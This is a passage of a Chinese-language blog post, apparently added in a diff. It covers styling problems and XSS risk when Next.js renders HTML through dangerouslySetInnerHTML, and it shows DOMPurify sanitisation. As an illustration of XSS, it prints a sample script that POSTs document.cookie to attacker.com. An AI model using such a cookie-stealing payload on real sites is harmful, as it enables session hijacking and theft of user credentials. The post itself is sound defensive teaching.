class="string">`</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> sanitizedHtml = <span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(untrustedHtml);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">SanitizeComponent</span>: <span class="title class_">React</span>.<span class="property">FC</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">dangerouslySetInnerHTML</span>=<span class="string">&#123;&#123;</span> <span class="attr">__html:</span> <span class="attr">sanitizedHtml</span> &#125;&#125; /&gt;</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">SanitizeComponent</span>;</span><br></pre></td></tr></table></figure>
+
+<p>在上述代码中，<code>DOMPurify.sanitize</code>方法会分析<code>untrustedHtml</code>，去除其中的<code>&lt;script&gt;</code>标签等可能存在安全风险的内容，然后将净化后的 HTML 通过<code>dangerouslySetInnerHTML</code>渲染到页面上，从而保证了应用的安全性。</p>
+<h2 id="五、关于-XSS-攻击"><a href="#五、关于-XSS-攻击" class="headerlink" title="五、关于 XSS 攻击"></a>五、关于 XSS 攻击</h2><p>XSS（Cross - Site Scripting）攻击是一种常见的 Web 安全漏洞，攻击者通过在网页中注入恶意脚本，当用户浏览该网页时，恶意脚本就会在用户的浏览器中执行。这些恶意脚本可以获取用户的敏感信息，如 Cookie、登录凭证等，或者进行一些恶意操作，如篡改页面内容、重定向用户等。</p>
+<p>在使用<code>dangerouslySetInnerHTML</code>时，如果不进行适当的安全处理，就很容易引入 XSS 漏洞。例如，当我们直接将用户输入的内容通过<code>dangerouslySetInnerHTML</code>渲染到页面上时，恶意用户可能会输入如下内容：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// 窃取用户Cookie并发送到攻击者服务器</span></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript">  xhr.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;https://attacker.com/steal&quot;</span>, <span class="literal">true</span>);</span></span><br><span class="line"><span class="language-javascript">  xhr.<span class="title function_">send</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>如果应用没有对用户输入进行严格的过滤和净化，这段恶意脚本就会在用户的浏览器中执行，导致用户信息泄露。因此，在使用<code>dangerouslySetInnerHTML</code>时，务必结合安全措施，如使用 sanitizer 库对输入进行净化，以防止 XSS 攻击。</p>
+<p>在 Next.js 中使用<code>dangerouslySetInnerHTML</code>时，我们需要充分了解其带来的样式问题和安全风险，并采取合适的解决方案来确保应用的稳定性和安全性。通过正确的样式隔离方法和对不可信 HTML 内容的净化处理，我们可以在享受<code>dangerouslySetInnerHTML</code>带来的便利的同时，避免潜在的问题。</p>
+<blockquote>
+<p>（注：文档部分内容可能由 AI 生成）</p>
+</blockquote>
+
+</article>
+    
+    
+
+<ul class="trm-post-copyright">
+    <li class="trm-post-copyright-author">
+        <strong>本文作者：</strong>
+        Tako Senpai
+    </li>
+    <li class="trm-post-copyright-link">
+        <strong>本文链接：</strong>
+        <a id="original-link" href="http://takosenpai2687.github.io/2025/08/15/Nextjs中使用 dangerouslySetInnerHTML 样式的踩坑指南/" title="Next.js 中使用 dangerouslySetInnerHTML 样式的踩坑指南">http://takosenpai2687.github.io/2025/08/15/Nextjs中使用 dangerouslySetInnerHTML 样式的踩坑指南/</a>
+    </li>
+    <li class="trm-post-copyright-license">
+        <strong>版权声明：</strong>
+        本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 ">CC BY-NC-SA 4.0</a> 许可协议。
+    </li>
+</ul>
+
+
+</div>
+<div id="post-next-prev" class="row">
+    <div class="col-lg-12">
+        <!-- title -->
+        <h5 class="trm-title-with-divider">
+            其他文章
+            <span data-number="02"></span>
+        </h5>
+    </div>
+    
+    
+        <div class="col-lg-6">
+    <div class="trm-blog-card trm-scroll-animation" data-scroll data-scroll-offset="40">
+        <a href="/2024/05/18/JavaScript%E4%BD%8D%E8%BF%90%E7%AE%97%E7%9A%84%E4%B8%80%E4%B8%AA%E5%9D%91/" class="trm-cover-frame trm-anima-link">
+            
+            
+                <img alt="cover" class="no-fancybox" src="/static/Bitwise/image.png">
+            
+        </a>
+        
+        <div class="trm-card-descr">
+            <div class="trm-label trm-category trm-mb-20">
+                <a href=" /categories/%E5%89%8D%E7%AB%AF/">
+                    前端
+                </a>
+            </div>
+            <h5>
+                <a href="/2024/05/18/JavaScript%E4%BD%8D%E8%BF%90%E7%AE%97%E7%9A%84%E4%B8%80%E4%B8%AA%E5%9D%91/" class="trm-anima-link">
+                    JavaScript 位运算的一个坑
+                </a>
+            </h5>
+            <div class="trm-divider trm-mb-20 trm-mt-20"></div>
+            <ul class="trm-card-data trm-label">
+                <li>2024/05/18</li>
+                <li>06:23</li>
+                
+                
+            </ul>
+        </div>
+    </div>
+</div>
+    
+</div>
+
+    
+
+
+
+                    <div class="trm-divider footer-divider"></div>
+
+                    <!-- footer -->
+                    <footer class="trm-scroll-animation" data-scroll data-scroll-offset="50">
+
+    
+
+    
+
+    
+        <div class="trm-footer-item">
+            <span>
+                由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v7.2.0
+            </span>
+            <span class="footer-separator" data-separator=" | "></span>
+            <span> 
+                主题 - 
+                <a rel="noopener" href='https://github.com/MaLuns/hexo-theme-async' target='_blank'>Async</a>
+                v2.0.9
+            </span>
+        </div>
+      
+
+     
+
+     
+</footer>
+ 
+                    <!-- footer end -->
+
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+            <!-- body end -->
+
+            <div class="trm-fixed-container" data-scroll data-scroll-sticky data-scroll-target=".locomotive-scroll__sticky-target" data-scroll-offset="-10">
+    
+        <div class="trm-fixed-btn" data-title="阅读模式" onclick="asyncFun.switchReadMode()">
+            <i class="iconfont fas fa-book-reader"></i>
+        </div>
+    
+    
+        <div class="trm-fixed-btn" data-title="单栏和双栏切换" onclick="asyncFun.switchSingleColumn()">
+            <i class="iconfont fas fa-arrows-alt-h"></i>
+        </div>
+    
+    <div id="trm-back-top" class="trm-fixed-btn" data-title="回到顶部">
+        <i class="iconfont fas fa-arrow-up"></i>
+    </div>
+</div>
+          </div>
+        </div>
+      </div>
+      <!-- scroll container end -->
+
+  </div>
+  <!-- app wrapper end -->
+
+  
+  <!-- Plugin -->
+
+
+
+
+    
+    
+<script src="https://unpkg.com/locomotive-scroll@4.1.4/dist/locomotive-scroll.min.js"></script>
+
+    
+<script src="https://unpkg.com/@fancyapps/ui@4.0/dist/fancybox.umd.js"></script>
+
+    
+
+    
+        <script src="/js/plugins/typing.js?v=2.0.9"></script>
+    
+
+    
+
+    <!-- 数学公式 -->
+    
+
+    <!-- 评论插件 -->
+    
+        
+
+        
+    
+
+
+
+<!-- CDN -->
+
+
+    
+
+    
+
+    
+
+
+
+
+    <!-- Service Worker -->
+    
+    <!-- baidu push -->
+    
+
+
+<script id="async-script" src="/js/main.js?v=2.0.9"></script>
+
+</body>
+
+</html>
